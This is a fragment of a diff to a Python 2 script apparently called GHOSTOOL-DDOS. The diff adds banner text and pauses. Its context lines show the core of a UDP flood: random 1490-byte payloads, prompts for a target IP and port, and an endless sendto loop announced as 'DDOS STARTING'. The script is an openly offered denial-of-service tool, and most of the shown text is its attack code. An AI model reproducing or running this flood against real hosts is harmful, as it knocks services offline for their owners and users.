@@ -18,7 +18,7 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet GHOST")
+os.system("figlet GHOSTOOL-DDOS")
 
 print
 print "----------*GHOST56*---------------"
@@ -30,6 +30,11 @@ port = input  ("PORT     : ")
 os.system("clear")
 os.system("figlet ENGAGE")
 print "DDOS STARTING"
+time.sleep(3)
+os.system("clear")
+os.system("figlet DDOS")
+time.sleep(2)
+
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
